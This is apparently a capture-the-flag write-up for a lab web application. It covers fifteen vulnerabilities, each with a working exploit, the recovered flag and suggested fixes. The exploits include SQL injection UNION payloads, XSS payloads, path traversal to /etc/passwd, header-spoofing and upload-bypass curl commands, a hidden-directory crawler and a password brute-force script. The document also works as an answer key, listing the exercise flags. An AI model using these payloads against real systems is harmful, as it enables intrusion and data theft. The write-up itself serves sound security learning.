# Security Exploits Documentation

This document details various security exploits and their corresponding fixes. Each section provides a comprehensive overview of the vulnerability, the exploit method, and recommended security measures.

## Table of Contents
1. [Hidden Email Exploit](#1-hidden-email-exploit)
2. [XSS via Feedback Form](#2-xss-via-feedback-form)
3. [File Upload Bypass](#3-file-upload-bypass)
4. [HTTP Header Manipulation](#4-http-header-manipulation)
5. [SQL Injection](#5-sql-injection)
6. [Image Metadata Extraction](#6-image-metadata-extraction)
7. [Cookie Manipulation](#7-cookie-manipulation)
8. [Directory Traversal](#8-directory-traversal)
9. [Open Redirect](#9-open-redirect)
10. [Robots.txt Information Disclosure](#10-robotstxt-information-disclosure)
11. [Media Source XSS](#11-media-source-xss)
12. [Survey Form Manipulation](#12-survey-form-manipulation)
13. [Email Recovery Exploit](#13-email-recovery-exploit)
14. [Hidden Directory Crawling](#14-hidden-directory-crawling)
15. [Login Brute Force](#15-login-brute-force)

## 1. Hidden Email Exploit

### Vulnerability
Hidden form field containing sensitive email information in the password recovery page.

### Exploit
```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value="Submit">
</form>
```

**Flag**: `d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Remove hidden fields for sensitive data
- Implement session-based authentication
- Validate email recovery requests server-side

## 2. XSS via Feedback Form

### Vulnerability
Cross-site scripting vulnerability in form input fields.

### Exploit
```html
<svg onload=alert(1)>test
```

**Flag**: `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

### Fix
- Sanitize user input using `htmlspecialchars()`
- Implement Content Security Policy (CSP)

## 3. File Upload Bypass

### Vulnerability
Unrestricted file upload functionality.

### Exploit
```bash
curl -X POST -H "multipart/form-data" -F "uploaded=@./test.jpeg" -F "Upload=Upload" "http://172.19.71.187/?page=upload;type=image/jpeg" | grep flag
```

**Flag**: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### Fix
- Validate MIME types
- Store uploaded files outside web root
- Scan files for malware

## 4. HTTP Header Manipulation

### Vulnerability
Security controls based on HTTP headers.

### Exploit
```bash
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" http://172.19.71.187/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Implement robust authentication mechanisms
- Don't rely solely on HTTP headers for security

## 5. SQL Injection

### Vulnerability
SQL injection in database queries.

### Exploit
```sql
-- Database version
1 UNION ALL SELECT NULL,version()--

-- Database names
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--

-- Table names
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=0x4D656D6265725F53716C5F496E6A656374696F6E--

-- Sensitive data
1 UNION ALL SELECT NULL,concat(Commentaire,countersign) FROM users--
```

**Flag**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Fix
- Use prepared statements
- Sanitize user input
- Implement WAF (Web Application Firewall)

## 6. Image Metadata Extraction

### Vulnerability
SQL injection to extract image metadata.

### Exploit
```sql
1 UNION ALL SELECT NULL,concat(url,title,comment) FROM Member_images.list_images--
```

**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Restrict database queries
- Hide table structure
- Implement strict access controls

## 7. Cookie Manipulation

### Vulnerability
Weakly hashed cookies.

### Exploit
Original cookie:
```
I_am_admin 68934a3e9455fa72420237eb05902327
```

Modified cookie:
```
b326b5062b2f0e69046810717534cb09
```

**Flag**: `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

### Fix
- Use secure cookie attributes
- Implement HMAC-based session management
- Use strong encryption algorithms

## 8. Directory Traversal

### Vulnerability
Path traversal in URL parameters.

### Exploit
```
http://172.19.71.187/?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

**Flag**: `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

### Fix
- Implement path validation and normalization
- Prevent directory traversal

## 9. Open Redirect

### Vulnerability
Unvalidated redirect URLs.

### Exploit
```
http://172.19.71.187/index.php?page=redirect&site=test
```

**Flag**: `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`

### Fix
- Validate and whitelist redirect URLs
- Prevent URL hijacking

## 10. Robots.txt Information Disclosure

### Vulnerability
Sensitive information exposed in robots.txt.

### Exploit
```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

**Flag**: `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

### Fix
- Don't expose sensitive files in robots.txt
- Implement strong authentication for admin areas

## 11. Media Source XSS

### Vulnerability
XSS via media source parameter.

### Exploit
```
http://172.28.162.203/index.php?page=media&src=nsa
```

Base64 payload:
```
data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

**Flag**: `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

### Fix
- Sanitize URL parameters
- Validate media source inputs

## 12. Survey Form Manipulation

### Vulnerability
Unvalidated form submissions.

### Exploit
```bash
curl 'http://x.x.x.x/index.php?page=survey#' --data 'sujet=2&valeur=42'
```

**Flag**: `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`

### Fix
- Implement strict server-side validation
- Limit accepted values

## 13. Email Recovery Exploit

### Vulnerability
Unsecured email recovery process.

### Exploit
```bash
curl 'http://x.x.x.x/?page=recover#' --data 'mail=test%40test.test&Submit=Submit'
```

**Flag**: `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Remove hidden fields for sensitive data
- Implement server-side validation
- Use secure session management

## 14. Hidden Directory Crawling

### Vulnerability
Exposed hidden directories.

### Exploit
```python
import requests
import time
from urllib.parse import urljoin

session = requests.Session()

def crawl(url, visited=set(), depth=0, max_depth=15):
    if url in visited or depth > max_depth:
        return
    visited.add(url)

    try:
        r = session.get(url, timeout=5)
        if r.status_code != 200:
            return

        print(f"[+] {url}")

        lines = r.text.splitlines()
        for line in lines:
            if 'href="' in line:
                start = line.find('href="') + 6
                end = line.find('"', start)
                href = line[start:end]

                if href == '../':
                    continue

                full_url = urljoin(url, href)

                if href.endswith('/'):
                    time.sleep(0.1)
                    crawl(full_url, visited, depth + 1)
                else:
                    print(f"    └── {full_url}")
                    if 'README' in href.upper():
                        try:
                            file_response = session.get(full_url, timeout=5)
                            if file_response.status_code == 200:
                                print("        --- README Content ---")
                                print(file_response.text)
                                print("        --------------------------")
                        except requests.exceptions.RequestException as e:
                            print(f"        [!] Error reading file: {e}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error on {url}: {e}")

# Example URL to crawl
crawl("http://172.28.162.203/.hidden/")
```

### Fix
- Secure hidden directories
- Limit access
- Remove unnecessary internal structure exposure

## 15. Login Brute Force

### Vulnerability
Weak password protection.

### Exploit
```python
import requests

passwords = [
    "123456", "password", "12345678", "qwerty", "abc123", "123456789", "111111", "1234567",
    "iloveyou", "adobe123", "123123", "Admin", "1234567890", "letmein", "photoshop", "1234",
    "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000"
]

url = "http://192.168.2.128/index.php"
params = {
    "page": "signin",
    "username": "admin",
    "Login": "Login#"
}

for pwd in passwords:
    params["password"] = pwd
    try:
        response = requests.post(url, params=params)
        if "flag" in response.text:
            print(f"[+] Password found: {pwd}")
            print(response.text)
            break
    except requests.RequestException as e:
        print(f"Error with password '{pwd}': {e}")
```

**Flag**: `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

### Fix
- Implement strong password policies
- Enable account lockout after failed attempts
- Use multi-factor authentication

## Security Best Practices

1. Always validate user input
2. Implement proper authentication and authorization
3. Use secure session management
4. Keep software and dependencies updated
5. Follow the principle of least privilege
6. Implement proper error handling
7. Use HTTPS for all communications
8. Regular security audits and penetration testing
9. Implement proper logging and monitoring
10. Follow secure coding practices

## Disclaimer

This document is for educational purposes only. The exploits described here should only be used in authorized testing environments and with proper permissions.
